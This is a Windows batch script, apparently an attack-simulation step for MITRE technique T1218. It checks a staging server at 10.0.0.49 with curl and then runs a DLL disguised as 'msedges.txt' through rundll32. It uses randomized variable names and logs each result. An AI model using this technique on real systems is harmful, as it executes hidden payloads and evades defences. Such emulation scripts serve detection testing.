@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET vzmcf=1
SET douyiw=%APPDATA%\7657\48645164
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7657-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=msedges.txt
SET rgnpbq=7657

REM Computed variables (random names)
SET jkbdt=%APPDATA%\!fkesh!\macula-simulations.log
SET wqjui=%APPDATA%\!fkesh!
SET fvxdm=0
SET ohkdf=
SET ynwbg=%SystemRoot%\System32\rundll32.exe

REM Debug logging function
IF !vzmcf!==1 (
    SET kplcv=!DATE! !TIME!
    SET kplcv=!kplcv:[=!
    SET kplcv=!kplcv:]=!
)

REM 1. Check server availability (heartbeat)
IF !vzmcf!==1 (
    echo [!kplcv!][DEBUG][!eykalkg!]: heartbeat=checking_!frytcn!>> "!jkbdt!" 2>nul
)
curl.exe -k -s -o nul "!frytcn!"
IF !ERRORLEVEL!==0 (
    SET fvxdm=1
    SET ohkdf=
) ELSE (
    SET ohkdf=connection_refused
)

REM T1218 logging
SET pzohs=!DATE!
SET dmjlc=!TIME!
SET pzohs=!pzohs:-=!
SET pzohs=!pzohs:/=!
IF "!pzohs:~4,1!"==" " SET pzohs=!pzohs:~0,4!-0!pzohs:~5,1!-!pzohs:~7!
IF "!pzohs:~7,1!"==" " SET pzohs=!pzohs:~0,7!0!pzohs:~8!
SET dmjlc=!dmjlc:.=!
SET dmjlc=!dmjlc:,=!
IF "!dmjlc:~0,1!"==" " SET dmjlc=0!dmjlc:~1!
IF "!dmjlc:~1,1!"==":" SET dmjlc=0!dmjlc!
IF "!dmjlc:~2,1!"==":" SET dmjlc=!dmjlc:~0,2!:0!dmjlc:~3!
SET sytlc=!pzohs:~0,4!-!pzohs:~4,2!-!pzohs:~6,2! !dmjlc:~0,2!:!dmjlc:~3,2!:!dmjlc:~6,2!.!dmjlc:~9,3!
echo [!sytlc!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!fvxdm!:!ohkdf!>> "!jkbdt!" 2>nul

IF NOT !fvxdm!==1 (
    EXIT /B 1
)

REM 3. Go to output directory
IF !vzmcf!==1 (
    echo [!kplcv!][DEBUG][!eykalkg!]: chdir=!douyiw!>> "!jkbdt!" 2>nul
)
cd /d "!douyiw!" >nul 2>&1

REM 4. Execute DLL via Rundll32
IF !vzmcf!==1 (
    echo [!kplcv!][DEBUG][!eykalkg!]: process_start=!ynwbg! "!ecrfwq!",DllMain>> "!jkbdt!" 2>nul
)
"!ynwbg!" "!ecrfwq!",DllMain

IF !ERRORLEVEL!==0 (
    SET fvxdm=1
    SET ohkdf=
) ELSE (
    SET fvxdm=0
    SET ohkdf=rundll32_failed
)

REM Log T1218 execution result
SET pzohs=!DATE!
SET dmjlc=!TIME!
SET pzohs=!pzohs:-=!
SET pzohs=!pzohs:/=!
IF "!pzohs:~4,1!"==" " SET pzohs=!pzohs:~0,4!-0!pzohs:~5,1!-!pzohs:~7!
IF "!pzohs:~7,1!"==" " SET pzohs=!pzohs:~0,7!0!pzohs:~8!
SET dmjlc=!dmjlc:.=!
SET dmjlc=!dmjlc:,=!
IF "!dmjlc:~0,1!"==" " SET dmjlc=0!dmjlc:~1!
IF "!dmjlc:~1,1!"==":" SET dmjlc=0!dmjlc!
IF "!dmjlc:~2,1!"==":" SET dmjlc=!dmjlc:~0,2!:0!dmjlc:~3!
SET sytlc=!pzohs:~0,4!-!pzohs:~4,2!-!pzohs:~6,2! !dmjlc:~0,2!:!dmjlc:~3,2!:!dmjlc:~6,2!.!dmjlc:~9,3!
echo [!sytlc!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!fvxdm!:!ohkdf!>> "!jkbdt!" 2>nul

EXIT /B 0